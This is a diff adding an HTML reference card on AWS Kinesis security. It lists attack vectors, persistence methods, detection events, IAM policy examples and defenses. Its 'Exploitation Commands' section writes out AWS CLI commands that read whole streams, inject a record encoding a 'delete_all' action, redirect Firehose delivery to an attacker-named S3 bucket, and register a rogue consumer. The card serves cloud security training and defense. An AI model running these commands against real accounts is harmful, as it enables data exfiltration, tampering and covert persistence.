@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Kinesis Security | AWS Security Cards</title>
+<meta name="description" content="Kinesis is a real-time data streaming service for collecting, processing, and analyzing data streams. Attackers exploit Kinesis to intercept real-time data, inject malicious records, and exfiltrate streaming data containing logs, events, and business transactions.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/kinesis-card.webp" alt="AWS Kinesis Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/kinesis.svg" alt="AWS Kinesis Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Kinesis Security</span>
+        <span class="header-badge">STREAMING</span>
+      </div>
+      <p class="header-desc">Kinesis is a real-time data streaming service for collecting, processing, and analyzing data streams. Attackers exploit Kinesis to intercept real-time data, inject malicious records, and exfiltrate streaming data containing logs, events, and business transactions.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Data Interception Risk</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">24h</div>
+          <div class="stat-label">Default Retention</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">1MB/s</div>
+          <div class="stat-label">Per Shard Write</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Real-time</div>
+          <div class="stat-label">Data Access</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Data Streams &amp; Shards</h4>
+          <p>Kinesis Data Streams ingest real-time data via shards. Each shard handles 1MB/s write and 2MB/s read. Data is retained for 24 hours by default (up to 365 days). Records are base64-encoded and ordered by sequence number.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> With GetRecords permission, an attacker can read ALL data in the retention window - SIEM events, transactions, PII, and application secrets in real-time.</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Firehose &amp; Delivery</h4>
+          <p>Kinesis Data Firehose delivers streaming data to S3, Redshift, Elasticsearch, Splunk, and HTTP endpoints. Attackers who modify the delivery destination can redirect entire data pipelines to attacker infrastructure.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Changing a Firehose destination is a single API call. All future data silently flows to the attacker while the original destination stops receiving data.</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 75%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">7.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Kinesis streams contain real-time data including logs, transactions, and events. Attackers can read historical data within retention period, inject malicious records, and redirect streams to attacker-controlled destinations.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Stream Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Stream data interception via GetRecords</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Record injection with PutRecord</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Firehose destination redirection</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Consumer hijacking via enhanced fan-out</li></ul><h4 style="color: #f87171;">Cross-Service Attacks</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Video stream interception (Kinesis Video)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Analytics application manipulation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Cross-account stream sharing abuse</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Lambda consumer code injection</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Encryption &amp; Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No server-side encryption on streams</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive stream IAM policies</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Long retention periods (365 days of data)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing consumer authorization</li></ul><h4 style="color: #fb923c;">Delivery &amp; Monitoring</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Firehose to public S3 bucket</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Unprotected video streams</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No monitoring on UpdateDestination calls</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Shared producer/consumer IAM roles</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Data Streams</div>
+          <pre><code>aws kinesis list-streams</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Stream</div>
+          <pre><code>aws kinesis describe-stream --stream-name my-stream</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Firehose Streams</div>
+          <pre><code>aws firehose list-delivery-streams</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Consumers</div>
+          <pre><code>aws kinesis list-stream-consumers --stream-arn &lt;arn&gt;</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Data-Based Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Read credentials from application log streams</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Intercept API keys in event streams</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Extract tokens from authentication streams</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Harvest secrets from config change events</li></ul><h4 style="color: #c084fc;">Infrastructure Exploitation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify Firehose IAM role for broader access</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Register consumer with elevated permissions</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Abuse Kinesis Analytics IAM role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Pivot through Lambda consumer roles</li></ul><div class="note"><strong>Key insight:</strong> Kinesis streams often carry SIEM and security event data. An attacker reading the security stream knows exactly what defenders see, enabling perfect evasion timing.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Stream-Based Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Register rogue enhanced fan-out consumer</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Redirect Firehose to attacker S3/HTTP endpoint</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject beacon records into streams</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create shadow stream mirroring data</li></ul><h4 style="color: #facc15;">Consumer Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Lambda consumer with backdoor code</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Analytics application exfiltrating data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Kinesis Agent forwarding to attacker</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Cross-account stream subscription</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetRecords (bulk read operations)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateDestination (Firehose redirect)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RegisterStreamConsumer (new consumer)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutRecord/PutRecords (data injection)</li></ul><h4 style="color: #4ade80;">Behavioral Indicators</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New consumers on sensitive streams</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual GetShardIterator with TRIM_HORIZON</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Firehose destination changes</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Spike in GetRecords from unknown principals</li></ul><div class="note"><strong>Tool reference:</strong> Pacu module kinesis__enum enumerates streams and consumers. CloudFox kinesis maps stream permissions to IAM roles.</div></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Read Stream from Beginning</div>
+          <pre><code>aws kinesis get-shard-iterator --stream-name target-stream --shard-id shardId-000000000000 --shard-iterator-type TRIM_HORIZON</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Inject Malicious Record</div>
+          <pre><code>aws kinesis put-record --stream-name app-events --partition-key inject --data 'eyJhY3Rpb24iOiJkZWxldGVfYWxsIn0='</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Redirect Firehose to Attacker S3</div>
+          <pre><code>aws firehose update-destination --delivery-stream-name logs --destination-id dest-1 --s3-destination-update BucketARN=arn:aws:s3:::attacker-bucket,RoleARN=arn:aws:iam::123:role/firehose</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Register Rogue Consumer</div>
+          <pre><code>aws kinesis register-stream-consumer --stream-arn arn:aws:kinesis:us-east-1:123:stream/sensitive --consumer-name attacker-consumer</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Firehose (Find Destination)</div>
+          <pre><code>aws firehose describe-delivery-stream --delivery-stream-name my-firehose --query 'DeliveryStreamDescription.Destinations'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Video Streams</div>
+          <pre><code>aws kinesisvideo list-streams --query 'StreamInfoList[*].{Name:StreamName,ARN:StreamARN}'</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Kinesis Access</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;kinesis:*&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Full Kinesis access enables data interception, injection, and stream manipulation</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Firehose Destination Control</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;firehose:UpdateDestination&quot;,
+    &quot;firehose:DescribeDeliveryStream&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}
+// Attacker can redirect ALL Firehose
+// delivery streams to their own S3/HTTP</code></pre>
+          <p class="policy-desc">UpdateDestination permission lets attacker redirect entire data pipelines silently</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Producer Only</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;kinesis:PutRecord&quot;,
+    &quot;kinesis:PutRecords&quot;
+  ],
+  &quot;Resource&quot;: &quot;arn:aws:kinesis:*:*:stream/app-events&quot;
+}</code></pre>
+          <p class="policy-desc">Limited to writing records to a specific stream - cannot read stream data</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Consumer with KMS</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;kinesis:GetRecords&quot;,
+    &quot;kinesis:GetShardIterator&quot;,
+    &quot;kinesis:DescribeStream&quot;
+  ],
+  &quot;Resource&quot;: &quot;arn:aws:kinesis:*:*:stream/app-events&quot;
+},
+{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;kms:Decrypt&quot;,
+  &quot;Resource&quot;: &quot;arn:aws:kms:*:*:key/stream-key-id&quot;
+}</code></pre>
+          <p class="policy-desc">Read-only access to specific stream with KMS decryption for encrypted data</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable Server-Side Encryption</h4>
+              <p>Encrypt stream data at rest with KMS to control access via key policies.</p>
+              <pre><code>aws kinesis start-stream-encryption \\\n  --stream-name my-stream \\\n  --encryption-type KMS \\\n  --key-id alias/kinesis-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📡</span>
+            <div>
+              <h4>Use Enhanced Fan-Out</h4>
+              <p>Registered consumers provide better access control and isolation than shared throughput.</p>
+              <pre><code>aws kinesis register-stream-consumer \\\n  --stream-arn &lt;arn&gt; \\\n  --consumer-name authorized-app</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">⏰</span>
+            <div>
+              <h4>Minimize Retention Period</h4>
+              <p>Reduce retention to limit historical data exposure window (default 24h, max 365 days).</p>
+              <pre><code>aws kinesis decrease-stream-retention-period \\\n  --stream-name sensitive-data \\\n  --retention-period-hours 24</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor Consumer Activity</h4>
+              <p>Alert on new consumers, unusual read patterns, or iterator type changes (especially TRIM_HORIZON).</p>
+              <pre><code>CloudWatch Alarm: RegisterStreamConsumer\nAlert on GetShardIterator TRIM_HORIZON\nfrom unknown principals</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Separate Producer/Consumer Roles</h4>
+              <p>Use different IAM roles for writing and reading stream data to enforce least privilege.</p>
+              <pre><code>Producer: kinesis:PutRecord only\nConsumer: kinesis:GetRecords only\nNEVER combine both</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🛡️</span>
+            <div>
+              <h4>Firehose Destination Controls</h4>
+              <p>Restrict UpdateDestination permission via SCP and monitor all destination changes.</p>
+              <pre><code>SCP: Deny firehose:UpdateDestination\n  except from approved admin roles</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Kinesis Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
